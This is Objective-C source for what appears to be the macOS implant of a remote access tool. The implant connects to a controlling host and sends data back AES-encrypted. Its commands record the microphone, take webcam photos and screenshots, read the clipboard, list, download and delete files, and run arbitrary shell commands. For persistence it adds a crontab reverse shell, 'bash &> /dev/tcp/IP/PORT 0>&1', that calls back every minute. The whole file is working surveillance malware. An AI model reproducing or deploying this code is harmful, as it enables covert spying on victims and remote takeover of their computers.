
#import "espl.h"

@implementation espl

@synthesize soundRecorder, fileManager;

BOOL micinuse;

-(id)init {
    printf("we are fucking initialized %s\n",[_skey UTF8String]);
    fileManager = [[NSFileManager alloc] init];
    return self;
}

//MARK: Convenience
-(void)blank {
    [self sendString:@"":_skey]; //bang
}

-(NSString *)forgetFirst:(NSArray *)args {
    int x = 1;
    NSString *path = @"";
    for (NSString *tpath in args) {
        if (x != 1) {
            path = [NSString stringWithFormat:@"%@%@ ",path,tpath];
        }
        x++;
    }
    return [path substringToIndex:[path length] - 1];
}

//MARK: Socketry

int sockfd;

-(int)connect:(NSString*)host
             :(long)port {
    socklen_t len;
    struct sockaddr_in address;
    int result;
    
    /*  Create a socket for the client.  */
    sockfd = socket (AF_INET, SOCK_STREAM, 0);
    /*  Name the socket, as agreed with the server.  */
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr ([host UTF8String]);
    address.sin_port = htons (port);
    len = sizeof (address);
    result = connect (sockfd, (struct sockaddr *) &address, len);
    return result;
}

-(void)sendData:(NSData *)data {
    unsigned char *prepData = (unsigned char *)[data bytes];
    write (sockfd, prepData, sizeof(data));
}

-(void)sendString:(NSString *)string
                 :(NSString *)key {
    string = [string stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
    
    NSData *plainTextData = [string dataUsingEncoding:NSUTF8StringEncoding];
    NSString *base64String = [plainTextData base64EncodedStringWithOptions:0];
    
    //system([[NSString stringWithFormat:@"terminal-notifier -message 'prefinalstr = %@' -execute 'echo \'%@\' | pbcopy'",base64String,base64String] UTF8String]);
    
    NSString *finalstr = [FBEncryptorAES encryptBase64String:base64String keyString:key separateLines:false];
    
    //system([[NSString stringWithFormat:@"terminal-notifier -message 'finalstr = %@' -execute 'echo \'%@\' | pbcopy'",finalstr,finalstr] UTF8String]);
    finalstr = [NSString stringWithFormat:@"%@EOF6D2ONE",finalstr];
    write (sockfd, [finalstr UTF8String], finalstr.length + 11);
}

//MARK: Mic

-(void)mic:(NSArray *)args {
    NSString *usage = @"Usage: mic [record|stop]";
    if (args.count == 1) {
        [self sendString:usage :_skey];
    }
    else if ([args[1] isEqualToString:@"record"]) {
        if ([self recordAudio]) {
            [self sendString:@"Listening..." :_skey];
        }
        else {
            [self sendString:@"Already Recording" :_skey];
        }
    }
    else if ([args[1] isEqualToString:@"stop"]) {
        if ([self stopAudio]) {
            [self download:[[NSArray alloc] initWithObjects:@"download",@"/tmp/.avatmp", nil]];
        }
        else {
            [self sendString:@"-1" :_skey];
        }
    }
    else {
        [self sendString:usage :_skey];
    }
}

-(void)initmic {
    NSString *tempDir;
    NSURL *soundFile;
    NSDictionary *soundSetting;
    tempDir = @"/tmp/";
    soundFile = [NSURL fileURLWithPath: [tempDir stringByAppendingString:@".avatmp"]];
    soundSetting = [NSDictionary dictionaryWithObjectsAndKeys:
                    [NSNumber numberWithFloat: 44100.0],AVSampleRateKey,
                    [NSNumber numberWithInt: kAudioFormatMPEG4AAC],AVFormatIDKey,
                    [NSNumber numberWithInt: 2],AVNumberOfChannelsKey,
                    [NSNumber numberWithInt: AVAudioQualityHigh],AVEncoderAudioQualityKey, nil];
    soundRecorder = [[AVAudioRecorder alloc] initWithURL: soundFile settings: soundSetting error: nil];
}
-(BOOL)stopAudio {
    if (micinuse) {
        [soundRecorder stop];
        micinuse = false;
        return true;
    }
    else {
        return false;
    }
    
}
-(BOOL)recordAudio {
    if (!micinuse) {
        [self initmic];
        [soundRecorder record];
        micinuse = true;
        return true;
    }
    else {
        return false;
    }
}

//MARK: Camera

-(void)takePicture {
    __block BOOL done = NO;
    [self captureWithBlock:^(NSData *imageData)
     {
         done = YES;
         if (imageData == nil) {
             [self sendString:@"-3" :_skey];
         }
         else {
             [self sendString:[NSString stringWithFormat:@"%lu",imageData.length] :_skey];
             [self sendFile:imageData];
         }
     }];
    while (!done) {
        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
    }
    [self stopcapture];
}

- (AVCaptureDevice *)getcapturedevice
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionUnspecified){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}
-(void)initcamera {
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPresetiFrame1280x720;
    AVCaptureDevice *device = nil;
    NSError *error = nil;
    device = [self getcapturedevice];
    
    //camera
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
    if (!input) {
        // Handle the error appropriately.
        NSLog(@"ERROR: trying to open camera: %@", error);
    }
    [self.session addInput:input];
    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
    [self.stillImageOutput setOutputSettings:outputSettings];
    [self.session addOutput:self.stillImageOutput];
    [self.session startRunning];
    [NSThread sleepForTimeInterval:1];
}

-(void)captureWithBlock:(void (^)(NSData *))block {
    //initialize camera
    [self initcamera];
    
    //capture picture
    AVCaptureConnection* videoConnection = nil;
    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
    {
        for (AVCaptureInputPort* port in [connection inputPorts])
        {
            if ([[port mediaType] isEqual:AVMediaTypeVideo])
            {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection)
            break;
    }
    
    //capture still image from video connection
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         if (error) {
             printf("there was an error with imagesamplebuffer!\n");
         }
         NSData* imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         
         if (imageData) {
             block(imageData);
         }
         else {
             block(nil);
         }
     }];
}

-(void)stopcapture {
    [self.session stopRunning];
}

//MARK: File Management

-(void)directoryList:(NSArray *)args {
    //basically "ls"
    printf("directory listing %s\n",[_skey UTF8String]);
    NSArray *files;
    NSString *dir = [fileManager currentDirectoryPath];
    if (args.count > 1) {
        dir = [self forgetFirst:args];
    }
    
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (!isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",dir]:_skey];
            return;
        }
        else { //IF EVERYTHING IS OK, LS!
            NSError *error;
            files = [fileManager contentsOfDirectoryAtPath:dir error:&error];
            if (error) { //if something goes wrong
                [self sendString:[NSString stringWithFormat:@"%@",error]:_skey];
                return;
            }
            
            //info of directories
            NSString *result = @"";
            for (NSString *fName in files) {
                NSDictionary *fAttr = [fileManager attributesOfItemAtPath:[NSString stringWithFormat:@"%@/%@",dir,fName] error:&error];
                
                //TODO: make this a function
                NSString *fSize = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileSize]];
                NSString *space1 = @"  ";
                int space1len = 10;
                for (unsigned int i = 0; i < space1len - [fSize length] && [fSize length] < space1len; i = i + 1) {
                    space1 = [NSString stringWithFormat:@"%@ ",space1];
                }
                
                NSString *fPerm = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFilePosixPermissions]];
                NSString *space2 = @"  ";
                int space2len = 4;
                for (unsigned int i = 0; i < space2len - [fPerm length] && [fPerm length] < space2len; i = i + 1) {
                    space2 = [NSString stringWithFormat:@"%@ ",space2];
                }
                
                NSString *fModDate = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileModificationDate]];
                NSString *space3 = @"  ";
                int space3len = 20;
                for (unsigned int i = 0; i < space3len - [fModDate length] && [fModDate length] < space3len; i = i + 1) {
                    space3 = [NSString stringWithFormat:@"%@ ",space3];
                }
                
                NSString *fOwner = [NSString stringWithFormat:@"%@",[fAttr objectForKey:NSFileOwnerAccountName]];
                NSString *space4 = @"  ";
                int space4len = 12;
                for (unsigned int i = 0; i < space4len - [fOwner length] && [fOwner length] < space4len; i = i + 1) {
                    space4 = [NSString stringWithFormat:@"%@ ",space4];
                }
                
                result = [result stringByAppendingString:[NSString stringWithFormat:@"%@%@%@%@%@%@%@%@%@\n",
                                                          fSize,
                                                          space1,
                                                          fPerm,
                                                          space2,
                                                          fModDate,
                                                          space3,
                                                          fOwner,
                                                          space4,
                                                          fName]];
            }
            if ([result length] > 0) {
                result = [result stringByReplacingOccurrencesOfString:@" +0000" withString:@""];
                result = [NSString stringWithFormat:@"total %lu\n%@",[files count],result];
                result = [result substringToIndex:[result length] - 1];
            }
            
            [self sendString:result:_skey];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]:_skey];
        return;
    }
}

-(void)changeWD:(NSArray *)args {
    //basically "cd"
    NSString *dir = NSHomeDirectory();
    if (args.count > 1) {
        dir = [self forgetFirst:args];
    }
    
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (isdir) {
            [fileManager changeCurrentDirectoryPath:dir];
            [self blank];
        }
        else {
            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]:_skey];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]:_skey];
    }
}

-(void)rmFile:(NSArray *)args {
    NSString *file = @"";
    if (args.count > 1) {
        file = [self forgetFirst:args];
    }
    else {
        [self sendString:@"Usage: rm filename":_skey];
        return;
    }
    BOOL isdir = false;
    if ([fileManager fileExistsAtPath:file isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]:_skey];
        }
        else {
            [fileManager removeItemAtPath:file error:NULL];
            [self sendString:@"":_skey];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]:_skey];
    }
}

-(void)download:(NSArray *)args {
    BOOL isdir;
    NSString *filepath = @"";
    if (args.count > 1) {
        filepath = [self forgetFirst:args];
    }
    
    if ([fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:@"-2" : _skey];
        }
        else {
            NSData *filedata = [fileManager contentsAtPath:filepath];
            [self sendString:[NSString stringWithFormat:@"%lu",filedata.length] :_skey];
            [self sendFile:filedata];
        }
    }
    else {
        [self sendString:@"-1" : _skey];
    }
}

-(void)receiveFile:(NSString *)saveToPath {
    //GLOBAL
    NSString *b64data;
    NSString *chunk;
    long bsize = 1024;
    char buffer[bsize];
    
    while(read (sockfd, &buffer, sizeof(buffer))) {
        //append chunk limited to 64 chars
        long blen = strlen(buffer);
        if (blen < bsize) {
            bsize = blen;
        }
        chunk = [[NSString stringWithFormat:@"%s",buffer] substringToIndex:bsize];
        b64data = [NSString stringWithFormat:@"%@%@",b64data,chunk];
        
        //check for terminating flag
        if (!([b64data rangeOfString:@"DONEEOF"].location == NSNotFound)) {
            //remove terminator
            b64data = [b64data stringByReplacingOccurrencesOfString:@"DONEEOF" withString:@""];
            //get data
            NSData *mydata = [[NSData alloc] initWithBase64EncodedString:b64data options: NSDataBase64DecodingIgnoreUnknownCharacters];
            [mydata writeToFile:@"/Users/lucasjackson/Downloads/pleasework.dylib" atomically:true];
            //exit while loop
            return;
        }
        //reset buffer
        memset(buffer,'\0',bsize);
    }
}


-(void)sendFile:(NSData *)fileData {
    NSString *writeToFileName = @"/private/tmp/.tmpenc";
    fileData = [fileData AES256EncryptWithKey:_skey];
    [fileData writeToFile:writeToFileName atomically:true];
    
    char bufferin[256];
    FILE *fp;
    fp = fopen([writeToFileName UTF8String], "r");
    
    /*
     stream file to socket
     some padding will exist but only at the end of the file
     we can handle this server side by removing the offset
     */
    while (!feof(fp))
    {
        unsigned long nRead = fread(bufferin, sizeof(char), 256, fp);
        if (nRead <= 0)
        printf("ERROR reading file\n");
        
        char *pBuf = bufferin;
        while (nRead > 0)
        {
            long nSent = send(sockfd, pBuf, nRead, 0);
            
            if (nSent == -1)
            {
                fd_set writefd;
                FD_ZERO(&writefd);
                FD_SET(sockfd, &writefd);
                
                if (select(0, NULL, &writefd, NULL, NULL) != 1)
                printf("ERROR waiting to write to socket\n");
                continue;
            }
            
            if (nSent == 0)
            printf("DISCONNECTED writing to socket\n");
            
            pBuf += nSent;
            nRead -= nSent;
        }
    }
    //our end send file command
    write(sockfd, "EOF6D2ONE", 9);
}


//MARK: Misc

-(void)executeCMD:(NSArray *)args {
    if (args.count == 1) {
        [self sendString:@"Usage: exec say hi; touch file":_skey];
        return;
    }
    system([[self forgetFirst:args] UTF8String]);
    [self sendString:@"":_skey];
}

-(void)idleTime {
    //returns number of seconds
    int64_t idlesecs = -1;
    io_iterator_t iter = 0;
    if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) {
        io_registry_entry_t entry = IOIteratorNext(iter);
        if (entry) {
            CFMutableDictionaryRef dict = NULL;
            if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) {
                CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
                if (obj) {
                    int64_t nanoseconds = 0;
                    if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) {
                        idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
                    }
                }
                CFRelease(dict);
            }
            IOObjectRelease(entry);
        }
        IOObjectRelease(iter);
    }
   [self sendString:[NSString stringWithFormat:@"%lld",idlesecs]:_skey];
}

-(void)getPid {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]:_skey];
}

-(void)getPaste {
    //easy :p
    NSPasteboard*  myPasteboard  = [NSPasteboard generalPasteboard];
    NSString *contents = [myPasteboard  stringForType:NSPasteboardTypeString];
    if (contents == nil) {
        [self sendString:@"empty":_skey];
    }
    [self sendString:contents:_skey];
}

-(void)set_brightness:(NSArray *)args {
    if (!(args.count > 1)) {
        [self sendString:@"Usage: brightness 0.x" : _skey];
        return;
    }
    const int kMaxDisplays = 16;
    const CFStringRef kDisplayBrightness = CFSTR(kIODisplayBrightnessKey);
    
    CGDirectDisplayID display[kMaxDisplays];
    CGDisplayCount numDisplays;
    CGDisplayErr err;
    err = CGGetActiveDisplayList(kMaxDisplays, display, &numDisplays);
    
    if (err != CGDisplayNoErr) {
        return;
    }
    
    for (CGDisplayCount i = 0; i < numDisplays; ++i) {
        CGDirectDisplayID dspy = display[i];
        CFDictionaryRef originalMode = CGDisplayCurrentMode(dspy);
        if (originalMode == NULL)
        continue;
        io_service_t service = CGDisplayIOServicePort(dspy);
        
        float brightness;
        err= IODisplayGetFloatParameter(service,
                                        kNilOptions, kDisplayBrightness,
                                        &brightness);
        if (err != kIOReturnSuccess) {
            fprintf(stderr,
                    "failed to get brightness of display 0x%x (error %d)",
                    (unsigned int)dspy, err);
            continue;
        }
        
        IODisplaySetFloatParameter(service, kNilOptions, kDisplayBrightness, [args[1] floatValue]);
        [self blank];
    }
}

-(void)screenshot {
    CGImageRef screenShot = CGWindowListCreateImage(CGRectInfinite, kCGWindowListOptionOnScreenOnly, kCGNullWindowID, kCGWindowImageDefault);
    NSBitmapImageRep *bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage:screenShot];
    // Create an NSImage and add the bitmap rep to it...
    NSImage *image = [[NSImage alloc] init];
    [image addRepresentation:bitmapRep];
    NSData *imageData = [image TIFFRepresentation];
    //convert to jpeg
    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imageData];
    NSNumber *compressionFactor = [NSNumber numberWithFloat:0.9];
    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:compressionFactor forKey:NSImageCompressionFactor];
    imageData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
    
    [self sendString:[NSString stringWithFormat:@"%lu",imageData.length] :_skey];
    [self sendFile:imageData];
}

-(void)removePersistence:(NSString *)ip
                        :(NSString *)port {
    NSString *persist = [NSString stringWithFormat:@"* * * * * bash &> /dev/tcp/%@/%@ 0>&1\n",ip,port];
    system("crontab -l > /private/tmp/.cryon");
    NSData *crondata = [fileManager contentsAtPath:@"/private/tmp/.cryon"];
    NSString *newcron = [[NSString alloc]initWithData:crondata encoding:NSUTF8StringEncoding];
    newcron = [newcron stringByReplacingOccurrencesOfString:persist withString:@""];
    [newcron writeToFile:@"/private/tmp/.cryon" atomically:true encoding:NSUTF8StringEncoding error:nil];
    system("crontab /private/tmp/.cryon; rm /private/tmp/.cryon");
    [self sendString:@"":_skey];
}

-(void)persistence:(NSString *)ip
                  :(NSString *)port {
    [self removePersistence:ip:port];
    NSString *payload = [NSString stringWithFormat:@"crontab -l > /private/tmp/.cryon; echo '* * * * * bash &> /dev/tcp/%@/%@ 0>&1' >> /private/tmp/.cryon;crontab /private/tmp/.cryon; rm /private/tmp/.cryon",ip,port];
    system([payload UTF8String]);
    [self sendString:@"":_skey];
}

-(void)openURL:(NSArray *)cmdarray {
    if (cmdarray.count == 1) {
        [self sendString:@"Usage: openurl http://example.com":_skey];
        return;
    }
    NSURL *url = [NSURL URLWithString:cmdarray[1]];
    [[NSWorkspace sharedWorkspace] openURL:url];
    [self blank];
}


@end






